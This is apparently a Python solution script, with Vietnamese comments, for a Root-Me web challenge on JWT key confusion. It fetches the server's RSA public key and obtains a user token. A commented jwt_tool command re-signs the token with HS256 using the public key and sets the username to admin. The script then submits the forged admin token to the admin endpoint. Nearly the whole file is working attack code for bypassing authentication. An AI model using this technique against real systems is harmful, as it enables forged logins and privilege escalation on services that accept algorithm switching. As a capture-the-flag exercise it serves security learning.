import requests
import json 

url1 = "http://challenge01.root-me.org/web-serveur/ch60/key"

url2 = "http://challenge01.root-me.org/web-serveur/ch60/auth"

url3 = "http://challenge01.root-me.org/web-serveur/ch60/admin"

x = requests.get(url1)
y = x.text[1:len(x.text)-2].split(',')
public_key = ""
public_key+=y[0][1:len(y[0])-1]+"\n"
for i in range(1,len(y)-1):
	public_key = public_key + y[i][2:len(y[i])-1]+"\n"
public_key+= y[len(y)-1][2:len(y[len(y)-1])-1]

print(public_key)

# lấy public key 

# Bước 2 sẽ là post đến url2 để có được cái jwt token
x = requests.post(url2,data={"username":"huyxxxx"})
jwt_token=json.loads(x.text)["Here is your token"]
print(jwt_token)
# Bước 3 là sẽ lấy cái jwt token người ta cho rồi chỉnh sửa username = admin 

# Sử dụng jwt_tool để chỉnh sửa 
# ./jwt_tool.py [jwt] -I (inject) -pc (payload claim / payload key) [payload key] -pv (payload value) [new payload value] -X (exploit) k (confusing key exploit) -pk (public key) [public key file]
#./jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh1eSJ9.aVjcsLfKjOhdtNjztv_1H7mSQYhutoH9UzuBUN5nXmYatt6wzCxScG2Kuj0JXn1mzoryx7kSmhIG3JeZnhVvla119-jeVnlMiO64Y7rH1jIRmsfmzgqBbiXsgjjtO-Ig7Isl7XUFgzQfUwmdaUIHGf1K9VNtqbrAeiUWdfc-mSsWCUCmlIFvul7TuElVNFKluisMiXgkYafcdgurT7ls7sJ4aJPPyiDfkoMq5SDCqI45FP-EwxdABpKA0oMJjHUqhM7ubE9ub6-NKbXKF4zTzCVjzS7afQSz4zCL7piGVDfe41Ggi7UkIKMttqIQtrjFV36NCJt_D7lwtWjv6f9Yhg -I -pc username -pv admin -X k -pk public_RSA.pem

# sau khi có thì submit và get Flag

new_jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Sg2hyVVU5Nau9qu1RxdW3oyjMj76WAPHitiAC42K4_U"

headers = {
	"Authorization":"Bearer "+new_jwt_token
}

x = requests.post(url3,headers=headers)
print(x.text)
